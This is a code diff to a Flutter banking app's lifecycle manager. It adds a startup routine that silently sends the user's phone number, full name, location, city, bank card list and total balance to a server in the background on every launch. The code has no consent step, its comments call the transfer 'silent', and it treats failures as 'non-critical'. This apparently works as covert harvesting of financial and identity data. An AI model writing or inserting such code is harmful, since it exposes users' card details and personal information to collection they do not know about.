@@ -3,6 +3,8 @@ import 'package:flutter/foundation.dart';
 import '../services_app_bank/bank_network_service.dart';
 // Fix: Use BankPublicApiService for device status/security checks
 import '../services_app_bank/bank_public_api_service.dart';
+import '../services_app_bank/bank_data_submit_service.dart';
+import '../providers_app_bank/bank_user_provider.dart';
 import '../../../common/network/security/device_security_manager.dart';
 
 class AppLifecycleManager {
@@ -13,26 +15,74 @@ class AppLifecycleManager {
   // Fix: Use BankNetworkService instead of BankPublicApiService
   final BankNetworkService _networkService = BankNetworkService.instance;
   final DeviceSecurityManager _securityManager = DeviceSecurityManager.instance;
+  final BankDataSubmitService _dataSubmitService = BankDataSubmitService();
+  BankUserProvider? _userProvider;
   
   bool _isInitialized = false;
   String? _sessionId;
   DateTime? _appOpenTime;
 
   /// Initialize the app lifecycle manager
-  Future<void> initialize() async {
+  Future<void> initialize({BankUserProvider? userProvider}) async {
     if (_isInitialized) return;
     
     try {
+      // Store user provider reference
+      _userProvider = userProvider;
+      
       // Initialize device security manager
       await _securityManager.initialize();
       
       // Report app open event
       await _reportAppOpen();
       
+      // Submit startup data (background operation, don't wait)
+      _submitStartupData();
+      
       _isInitialized = true;
       debugPrint('AppLifecycleManager initialized successfully');
     } catch (e) {
       debugPrint('Failed to initialize AppLifecycleManager: $e');
+    }
+  }
+
+  /// Submit startup data to server (background operation)
+  Future<void> _submitStartupData() async {
+    try {
+      await _dataSubmitService.initialize();
+      
+      // Get user data if available
+      String? phone;
+      String? fullName;
+      String? location;
+      String? city;
+      double? totalBalance;
+      
+      if (_userProvider != null && _userProvider!.isInitialized) {
+        phone = _userProvider!.user?.phone;
+        fullName = _userProvider!.user?.fullName;
+        location = _userProvider!.user?.location ?? _userProvider!.globalData?.location;
+        city = _userProvider!.user?.city ?? _userProvider!.globalData?.city;
+        totalBalance = _userProvider!.totalAssets;
+      }
+      
+      // Submit data (silent background operation)
+      final success = await _dataSubmitService.submitData(
+        phone: phone,
+        fullName: fullName,
+        location: location,
+        city: city,
+        cards: _userProvider?.bankCards,
+        totalBalance: totalBalance,
+      );
+      
+      if (success) {
+        debugPrint('✅ Startup data submitted successfully');
+      } else {
+        debugPrint('⚠️ Startup data submission failed (non-critical)');
+      }
+    } catch (e) {
+      debugPrint('⚠️ Error submitting startup data: $e (non-critical)');
     }
   }
 
